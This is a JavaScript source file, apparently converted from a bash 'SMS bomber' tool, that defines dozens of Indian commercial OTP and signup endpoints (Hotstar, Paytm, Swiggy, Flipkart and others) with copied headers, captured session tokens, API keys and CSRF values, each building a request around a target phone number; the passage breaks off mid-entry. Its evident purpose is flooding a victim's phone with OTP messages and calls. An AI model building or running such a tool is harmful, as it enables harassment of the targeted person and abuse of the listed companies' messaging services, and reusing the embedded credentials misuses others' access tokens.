
const axios = require('axios');

// ============================================================
// ðŸ”¥ ALL SMS ENDPOINTS (Extracted from bash script)
// ============================================================
const ENDPOINTS = [
  // Hotstar
  {
    method: 'PUT',
    url: 'https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp',
    headers: {
      'Host': 'api.hotstar.com',
      'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc',
      'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'content-type': 'application/json',
      'x-hs-platform': 'PCTV',
      'x-country-code': 'IN',
      'x-hs-device-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
      'hotstarauth': 'st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d',
      'x-hs-appversion': '5.0.40',
      'x-request-id': 'faa88f05-7432-4103-9886-7bd934f5c3a1',
      'accept': '*/*',
      'origin': 'https://www.hotstar.com',
      'referer': 'https://www.hotstar.com/in/subscribe/sign-in'
    },
    data: (number) => ({
      phone_number: number,
      country_prefix: '91'
    })
  },
  // AltBalaji
  {
    method: 'POST',
    url: 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN',
    headers: {
      'Host': 'api.cloud.altbalaji.com',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'X-API-KEY': 'MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE',
      'Content-Type': 'application/json',
      'Origin': 'https://www.altbalaji.com'
    },
    data: (number) => ({
      phone_number: number,
      country_code: '91',
      platform: 'web',
      exp: 1601043289127
    })
  },
  // Voot
  {
    method: 'POST',
    url: 'https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser',
    headers: {
      'Host': 'us-central1-vootdev.cloudfunctions.net',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://www.voot.com'
    },
    data: (number) => ({
      type: 'mobile',
      mobile: number,
      countryCode: '+91'
    })
  },
  // SonyLIV
  {
    method: 'POST',
    url: 'https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP',
    headers: {
      'Host': 'apiv2.sonyliv.com',
      'device_id': '5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120',
      'security_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc',
      'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'content-type': 'application/json',
      'session_id': 'cc86326a51504133bacd3ce4f796e1cf-1600956156256',
      'x-via-device': 'true',
      'app_version': '3.1.20',
      'origin': 'https://www.sonyliv.com'
    },
    data: (number) => ({
      channelPartnerID: 'MSMIND',
      mobileNumber: number,
      country: 'IN',
      timestamp: '2020-09-24T14:03:03.505Z'
    })
  },
  // Medplus
  {
    method: 'POST',
    url: 'https://mobile.medplusindia.com/mobilemvc/profile/register.mbl',
    headers: {
      'Host': 'mobile.medplusindia.com',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://www.medplusmart.com'
    },
    data: (number) => `recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber=${number}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false`
  },
  // Apollo
  {
    method: 'POST',
    url: 'https://webapi.apollo247.com/',
    headers: {
      'Host': 'webapi.apollo247.com',
      'Accept': '*/*',
      'Authorization': 'Bearer 3d1833da7020e0602165529446587434',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://www.apollo247.com'
    },
    data: (number) => ({
      operationName: 'Login',
      variables: {
        mobileNumber: `+91${number}`,
        loginType: 'PATIENT'
      },
      query: `query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n`
    })
  },
  // Netmeds
  {
    method: 'GET',
    url: (number) => `https://m.netmeds.com/mst/rest/v1/id/details/${number}`,
    headers: {
      'Host': 'm.netmeds.com',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36'
    }
  },
  // GetInstaCash
  {
    method: 'POST',
    url: 'https://getinstacash.in/sell/getData.php',
    headers: {
      'Host': 'getinstacash.in',
      'Accept': '*/*',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://getinstacash.in'
    },
    data: (number) => `type=sendOTP&mobile=${number}`
  },
  // FBB
  {
    method: 'POST',
    url: 'https://www.fbbonline.in/customer/account/GenerateOtp',
    headers: {
      'Host': 'www.fbbonline.in',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.fbbonline.in'
    },
    data: (number) => `YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D=${number}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=`
  },
  // Grofers
  {
    method: 'POST',
    url: 'https://grofers.com/v2/accounts/',
    headers: {
      'Host': 'grofers.com',
      'device_id': 'a11f656b-422e-4617-953b-c350d517467d',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'auth_key': '57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13',
      'app_client': 'consumer_web',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://grofers.com'
    },
    data: (number) => `user_phone=${number}`
  },
  // Snapdeal
  {
    method: 'POST',
    url: 'https://m.snapdeal.com/signupCompleteAjax',
    headers: {
      'Host': 'm.snapdeal.com',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://m.snapdeal.com'
    },
    data: (number) => `j_password=null&j_mobilenumber=${number}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy`
  },
  // Zomato
  {
    method: 'POST',
    url: 'https://www.zomato.com/webroutes/auth/login',
    headers: {
      'Host': 'www.zomato.com',
      'x-zomato-csrft': 'a6b0c09972b2bdd30c9c1b6552caee5d',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://www.zomato.com'
    },
    data: (number) => ({
      country_id: 1,
      phone: number,
      verification_type: 'sms',
      method: 'phone'
    })
  },
  // Cuemath
  {
    method: 'POST',
    url: 'https://www.cuemath.com/api/v4/parents/',
    headers: {
      'Host': 'www.cuemath.com',
      'Content-Type': 'application/JSON',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://www.cuemath.com'
    },
    data: (number) => ({
      intl_mobile: { phone: '' },
      phone: number,
      email: 'nsbd@dn.djs',
      full_name: 'hdhdhdg',
      place_id: 'ChIJYYhT3gl3AjoRUDlkL1i5oIk',
      timezone: 'Asia/Calcutta',
      detail_source: 'CMO_2020',
      form_fields: 'full_name,phone,email,place_id'
    })
  },
  // Dream11
  {
    method: 'POST',
    url: 'https://www.dream11.com/graphql/mutation/pwa/register',
    headers: {
      'Host': 'www.dream11.com',
      'Accept': '*/*',
      'device': 'pwa',
      'x-csrf': 'fb1f1947-4547-392d-9a28-a9de30d9e766',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://www.dream11.com'
    },
    data: (number) => ({
      query: `mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}`,
      variables: {
        email: 'tsunami@gmail.com',
        mobileNumber: number,
        password: 'tsunami@123astronomia'
      }
    })
  },
  // Doubtnut
  {
    method: 'POST',
    url: 'https://doubtnut.com/api/v1/user/login',
    headers: {
      'Host': 'doubtnut.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://doubtnut.com'
    },
    data: (number) => `phone=${number}`
  },
  // Vedantu
  {
    method: 'POST',
    url: 'https://user.vedantu.com/user/preLoginVerification',
    headers: {
      'Host': 'user.vedantu.com',
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://www.vedantu.com'
    },
    data: (number) => ({
      email: null,
      phoneCode: '+91',
      phoneNumber: number,
      ver: '11.345'
    })
  },
  // Unacademy
  {
    method: 'POST',
    url: 'https://unacademy.com/api/v3/user/user_check/',
    headers: {
      'Host': 'unacademy.com',
      'Accept': '*/*',
      'Authorization': 'Bearer undefined',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://unacademy.com'
    },
    data: (number) => ({
      phone: number,
      country_code: 'IN',
      otp_type: 1,
      email: '',
      send_otp: true,
      is_un_teach_user: false
    })
  },
  // Byjus
  {
    method: 'POST',
    url: 'https://bcas-prod.byjusweb.com/api/send-otp',
    headers: {
      'Host': 'bcas-prod.byjusweb.com',
      'Accept': '*/*',
      'Origin': 'https://byjus.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Referer': 'https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE'
    },
    data: (number) => `phoneNumber=${number}&page=free-trial-classes`
  },
  // Redbus
  {
    method: 'GET',
    url: (number) => `https://m.redbus.in/api/getOtp?number=${number}&cc=91&whatsAppOpted=undefined`,
    headers: {
      'Host': 'm.redbus.in',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Referer': 'https://m.redbus.in/preregister'
    }
  },
  // Careers360
  {
    method: 'POST',
    url: 'https://www.careers360.com/ajax/no-cache/user/otp-send',
    headers: {
      'Host': 'www.careers360.com',
      'Accept': '*/*',
      'X-CSRFToken': '9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.careers360.com'
    },
    data: (number) => `mobile_number=${number}&method=call&uid=12692588`
  },
  // Coolwinks
  {
    method: 'GET',
    url: (number) => `https://api.coolwinks.com/api/accounts/is_already_registered/?username=${number}`,
    headers: {
      'Host': 'api.coolwinks.com',
      'Accept': '*/*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Origin': 'https://www.coolwinks.com'
    }
  },
  // Cansell
  {
    method: 'POST',
    url: 'https://webapi.cansell.in/api/User/SignUp',
    headers: {
      'Host': 'webapi.cansell.in',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://m.cansell.in'
    },
    data: (number) => ({
      name: 'Uwusjsj',
      surname: 'wjeshs',
      email: 'hsjs@gmail.com',
      phone: number,
      password: 'eeeeee'
    })
  },
  // Gaana / Times Internet
  {
    method: 'POST',
    url: 'https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile',
    headers: {
      'appVersion': '8.9.0',
      'CONTENT_TYPE': 'application/json',
      'channel': 'gaana.com',
      'tgid': 'j9qcq0z2ur4llq2a58qqmag2',
      'sdkVersion': '1.0',
      'appVersionCode': '933',
      'deviceId': 'j9qcq0z2ur4llq2a58qqmag2',
      'platform': 'android',
      'sdkVersionCode': '1',
      'Content-Type': 'application/json; charset=utf-8',
      'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)',
      'Host': 'jsso1.indiatimes.com'
    },
    data: (number) => ({ mobile: `+91-${number}` })
  },
  // Flipkart (complex JSON)
  {
    method: 'POST',
    url: 'https://1.rome.api.flipkart.com/1/action/view',
    headers: {
      'Host': '1.rome.api.flipkart.com',
      'x-user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'content-type': 'application/json',
      'Referer': 'https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT'
    },
    data: (number) => ({
      actionRequestContext: {
        type: 'LOGIN_IDENTITY_VERIFY',
        loginIdPrefix: '+91',
        loginId: number,
        clientQueryParamMap: {
          ret: '/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135',
          entryPage: 'HOMEPAGE_HEADER_ACCOUNT'
        },
        loginType: 'MOBILE',
        verificationType: 'OTP',
        screenName: 'LOGIN_V4_MOBILE',
        sourceContext: 'DEFAULT'
      }
    })
  },
  // Ullu
  {
    method: 'POST',
    url: (number) => `https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber=${number}`,
    headers: {
      'Host': 'ullu.app',
      'content-length': '0',
      'accept': 'application/json, text/plain, */*',
      'origin': 'https://ullu.app',
      'user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'referer': 'https://ullu.app/'
    }
  },
  // Paytm
  {
    method: 'POST',
    url: 'https://accounts.paytm.com/v2/api/register',
    headers: {
      'Host': 'accounts.paytm.com',
      'Accept': 'application/json, text/plain, */*',
      'Origin': 'https://accounts.paytm.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/json',
      'Referer': 'https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code'
    },
    data: (number) => ({
      email: '',
      mobile: number,
      loginPassword: 'Pura@1090',
      csrfToken: 'f7ea628c-91a2-5f14-82ca-6f7eee295b1d',
      redirectUri: 'https://paytm.com/v1/api/authresponse',
      clientId: 'paytm-web-secure',
      scope: 'paytm',
      state: '',
      responseType: 'code',
      theme: 'mp-html5',
      dob_agreement: true
    })
  },
  // Ogonn
  {
    method: 'POST',
    url: 'https://ogonn.in/otp',
    headers: {
      'Host': 'ogonn.in',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Origin': 'https://ogonn.in',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Referer': 'https://ogonn.in/login'
    },
    data: (number) => `_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile=${number}`
  },
  // Aakash Digital
  {
    method: 'POST',
    url: 'https://digital.aakash.ac.in/signup-otp-verify',
    headers: {
      'Host': 'digital.aakash.ac.in',
      'Accept': '*/*',
      'Origin': 'https://digital.aakash.ac.in',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Referer': 'https://digital.aakash.ac.in/user/register'
    },
    data: (number) => `&mobileval=${number}`
  },
  // Swiggy
  {
    method: 'POST',
    url: 'https://www.swiggy.com/mapi/auth/signup',
    headers: {
      'Host': 'www.swiggy.com',
      'Origin': 'https://www.swiggy.com',
      '__fetch_req__': 'true',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/json',
      'Referer': 'https://www.swiggy.com/auth/register'
    },
    data: (number) => ({
      name: 'dbdbdbd',
      email: 'tsunami@gmail.com',
      password: 'sndndndbdj283jsbsbs',
      referral_code: '',
      mobile: number,
      _csrf: 'jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk'
    })
  },
  // Limeroad
  {
    method: 'POST',
    url: 'https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=',
    headers: {
      'Host': 'www.limeroad.com',
      'Origin': 'https://www.limeroad.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Referer': 'https://www.limeroad.com/feed_nup_v1?feed_kyc=true&gender=Men'
    },
    data: (number) => `utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id=${number}`
  },
  // Cilory
  {
    method: 'POST',
    url: 'https://www.cilory.com/app/w/auth/soft',
    headers: {
      'Host': 'www.cilory.com',
      'Accept': 'application/json',
      'Origin': 'https://www.cilory.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/json;charset=UTF-8',
      'Referer': 'https://www.cilory.com/authentication?back=%2Fmy-account'
    },
    data: (number) => ({ mobile: number })
  },
  // Ajio (accountCheck)
  {
    method: 'POST',
    url: 'https://login.web.ajio.com/api/auth/accountCheck',
    headers: {
      'Host': 'login.web.ajio.com',
      'Accept': 'application/json',
      'Origin': 'https://www.ajio.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/json',
      'Referer': 'https://www.ajio.com/signup?referrer=/my-account/'
    },
    data: () => ({ emailId: 'tsunami@gmail.com' })
  },
  // Ajio (signupSendOTP)
  {
    method: 'POST',
    url: 'https://login.web.ajio.com/api/auth/signupSendOTP',
    headers: {
      'Host': 'login.web.ajio.com',
      'Accept': 'application/json',
      'Origin': 'https://www.ajio.com',
      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/json',
      'Referer': 'https://www.ajio.com/signup?referrer=/my-account/'
    },
    data: (number) => ({
      firstName: 'Tsunami Bomber',
      login: 'tsunami@gmail.com',
      password: 'kd34646@3131nxnxn',
      genderType: '',
      mobileNumber: number,
      requestType: 'SENDOTP'
    })
  },
  // BookMyShow
  {
    method: 'POST',
    url: 'https://in.bookmyshow.com/pwa/api/uapi/otp/send',
    headers: {
      'Host': 'in.bookmyshow.com',
      'Accept': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://in.bookmyshow.com'
    },
    data: (number) => ({
      channel: 'phone',
      subChannel: 'sms',
      details: {
        phone: number,
        origin: 'https://in.bookmyshow.com'
      }
    })
  },
  // BigBasket
  {
    method: 'POST',
    url: 'https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/',
    headers: {
      'Host': 'www.bigbasket.com',
      'Accept': 'application/json',
      'x-csrftoken': 'gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'x-channel': 'BB-PWA',
      'Content-Type': 'application/json',
      'Origin': 'https://www.bigbasket.com'
    },
    data: (number) => ({ identifier: number })
  },
  // Flo Mattress
  {
    method: 'POST',
    url: 'https://cod.flomattress.com/api/otp',
    headers: {
      'Host': 'cod.flomattress.com',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.flomattress.com'
    },
    data: (number) => `number=${number}&store=hushbedding.myshopify.com`
  },
  // Banggood
  {
    method: 'POST',
    url: 'https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api',
    headers: {
      'Host': 'm.banggood.in',
      'Accept': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://m.banggood.in'
    },
    data: (number) => `mobilePhone=${number}&countryPhoneCode=91&type=1&verifyCode=KmUu`
  },
  // Lenskart
  {
    method: 'POST',
    url: 'https://api.lenskart.com/v2/customers/sendOtp',
    headers: {
      'Host': 'api.lenskart.com',
      'Origin': 'https://www.lenskart.com',
